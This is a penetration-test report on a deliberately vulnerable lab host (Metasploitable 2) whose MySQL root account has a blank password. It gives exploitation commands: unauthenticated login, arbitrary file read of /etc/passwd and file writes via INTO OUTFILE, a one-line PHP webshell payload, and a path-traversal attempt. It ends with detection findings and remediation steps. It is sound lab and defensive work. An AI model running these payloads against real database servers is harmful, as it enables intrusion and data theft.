## Target: Metasploitable 2 (192.168.75.130)
## Service: MySQL 5.0.51a-3ubuntu5
## Classification: CWE-306 (Missing Authentication for Critical Function), CWE-732 (Incorrect Permission Assignment)
## CVSS 3.1 Estimate: 9.8 (Critical) — Network / Low Complexity / No Auth Required / Full Confidentiality-Integrity Impact
## MITRE ATT&CK: T1190 (Exploit Public-Facing Application), T1078 (Valid Accounts), T1505.003 (Web Shell)

1. Executive Summary
MySQL on the target host is configured with an unauthenticated root account (root@'%', blank password), granted full privileges including FILE, and reachable from any host on the network. This configuration allows any network-adjacent attacker to authenticate as database administrator without credentials and abuse the FILE privilege to read and write arbitrary files on the underlying operating system, subject to OS-level file permission constraints on the mysql service account.
In this engagement, arbitrary file read and write were both confirmed against world-writable filesystem locations (/tmp). Escalation to web-based remote code execution via webshell was attempted but blocked by OS-level directory permissions restricting the mysql process user's write access to the Apache document root (/var/www). This represents a partial but still critical finding: the primitive is real and exploitable, and its containment in this instance is due to filesystem permissions rather than any MySQL-level control.

2. Reconnaissance
Service and version identification:
bashnmap -sV -p 3306 192.168.75.130
Result: 3306/tcp open mysql MySQL 5.0.51a-3ubuntu5
This version is over a decade past end-of-life and predates several hardening features introduced in later MySQL/MariaDB releases — most notably secure_file_priv, which was not introduced until MySQL 5.5.53/5.6.34. Its absence here is a version artifact, not a misconfiguration, but it has the same practical effect: no server-side restriction on where LOAD_FILE() / INTO OUTFILE can operate, leaving OS file permissions as the only remaining control.

3. Exploitation
3.1 Authentication
bashmysql -h 192.168.75.130 -u root --skip-ssl -p
Password prompt bypassed with a blank entry. Successful authentication as root@% was confirmed:
sqlSELECT CURRENT_USER();
-- root@%
Finding: No password is required for the MySQL root account, and the account is not restricted to localhost ('%' host wildcard). This alone is a critical finding independent of anything that follows.
3.2 Privilege Enumeration
sqlSHOW GRANTS FOR CURRENT_USER();
-- GRANT ALL PRIVILEGES ON *.* TO 'root'@'%' WITH GRANT OPTION
Full administrative privileges confirmed, including implicit FILE privilege under ALL PRIVILEGES.
sqlSELECT @@secure_file_priv;
On this MySQL version, this variable is either unsupported or returns NULL without enforcing restriction — confirmed empirically that file operations were not blocked by this mechanism during testing.
3.3 Arbitrary File Write — Proof of Concept
sqlSELECT 'pwned_by_mysql' INTO OUTFILE '/tmp/backdoor.txt';
Result: Query OK, 1 row affected
Verification via read-back, using the same privilege in reverse:
sqlSELECT LOAD_FILE('/tmp/backdoor.txt');
-- pwned_by_mysql
Finding: Confirmed arbitrary file write and read primitive via unauthenticated MySQL access, with content controlled entirely by the attacker's query.
3.4 Escalation Attempt — Webshell via Document Root
Objective: escalate file write primitive to remote code execution by placing a PHP payload inside Apache's document root.
Web server fingerprint (validated independently, correlating with prior port 80 assessment):
bashcurl -i http://192.168.75.130/
Confirmed: Apache/2.2.8, PHP/5.2.4, with application directories /dvwa/, /mutillidae/, /twiki/, /phpMyAdmin/, /dav/ under /var/www.
Attempted write:
sqlSELECT 'test' INTO OUTFILE '/var/www/mutillidae/dbtest.txt';
-- ERROR 1 (HY000): Can't create/write to file '/var/www/mutillidae/dbtest.txt' (Errcode: 13)
Errcode 13 (EACCES) confirmed across multiple document root paths, including /var/www/dvwa/, /var/www/dvwa/hackable/uploads/, and /var/www/ itself. OS-level ownership check confirmed the constraint:
sqlSELECT LOAD_FILE('/etc/passwd');
-- mysql:x:109:118:MySQL Server,,,:/var/lib/mysql:/bin/false
Finding: The mysqld process runs as a dedicated, non-interactive service account (mysql, UID 109) with no shell access and no write permission to the Apache document root. The file write primitive is real and unauthenticated, but its impact in this instance is contained to world-writable filesystem paths (/tmp, /var/tmp) and does not extend to web-facing remote code execution without an additional privilege escalation or misconfiguration elsewhere on the host.
A webshell was still successfully written to demonstrate the primitive fully, with an understanding that it is not web-reachable in this configuration:
sqlSELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/tmp/shell.php';
Confirmed on disk via LOAD_FILE() read-back. Attempted access via path traversal (curl 'http://192.168.75.130/../../tmp/shell.php?cmd=id') correctly returned 404 Not Found — Apache does not serve outside its document root, and no traversal misconfiguration was present.
3.5 Further Escalation Path Ruled Out
sqlSELECT * FROM mysql.func;
-- Empty set
No user-defined functions (lib_mysqludf_sys, sys_exec, etc.) were present, ruling out the direct-command-execution UDF technique as an alternative path to shell without file-write dependency.

4. Impact Assessment
CapabilityStatusUnauthenticated administrative DB accessConfirmedArbitrary file read (any file mysql user can access)ConfirmedArbitrary file write (world-writable paths)ConfirmedArbitrary file write (web document root)Blocked — OS permissionsRemote code execution via webshellNot achieved in this configurationDirect command execution via UDFNot available (no UDFs loaded)
Even without RCE, the confirmed read primitive alone is severe: /etc/passwd, application source code, configuration files containing credentials, and any file readable by the mysql OS user are exposed to any network-adjacent unauthenticated actor.

5. Detection Engineering Notes
Detection was evaluated across three layers; results and limitations are reported honestly below rather than presenting only what worked cleanly.
File Integrity Monitoring (Wazuh syscheck): intended primary detection layer for the file-write outcome; not reliably validated in this test cycle due to local agent inconsistency. Recommended as the most durable long-term control, since it detects the outcome (new executable file in a monitored path) independent of the technique used to create it.
Network-based (Suricata): MySQL traffic on port 3306 was captured during the attack, but the default Suricata configuration logged these flows with app_proto: "failed" — the built-in MySQL protocol parser did not extract query-level payload content without additional app-layer tuning in suricata.yaml. This is reported as a real, tested limitation rather than a theoretical one: out-of-the-box Suricata will not detect INTO OUTFILE abuse over MySQL's wire protocol. A working signature requires explicit MySQL app-layer parsing to be enabled and payload logging configured — this is left as a documented follow-up rather than a claimed success.
Query/authentication logging (MySQL-native): MySQL 5.0.51a predates the general_log system variable entirely (ERROR 1193: Unknown system variable), confirmed empirically during testing. Query-level and authentication-level detection via MySQL's own logging is not possible on this version without falling back to older, more limited logging directives at daemon startup. This is a meaningful, version-specific finding worth stating plainly: legacy MySQL deployments may be effectively unloggable at the query level using modern tooling assumptions.
Three Sigma rules were authored against these findings (file-event-based, network-based, and authentication-based), each with false-positive and applicability caveats documented inline, reflecting what was actually validated versus what remains aspirational pending further environment tuning.

6. Remediation

Set a strong, unique password for the MySQL root account; never permit blank-password authentication
Restrict root to localhost only; create scoped, least-privilege accounts for any remote application access
Revoke FILE privilege from application-facing accounts; it is rarely required outside DBA tooling
Bind mysqld to 127.0.0.1 unless remote access is explicitly required, and firewall port 3306 at the network layer regardless
Upgrade to a supported MySQL/MariaDB release with secure_file_priv enforced by default
Enable query logging (general_log or equivalent) shipped to centralized log management, understanding the performance trade-off
Deploy FIM on web-writable and world-writable directories as a technique-agnostic backstop against this entire attack class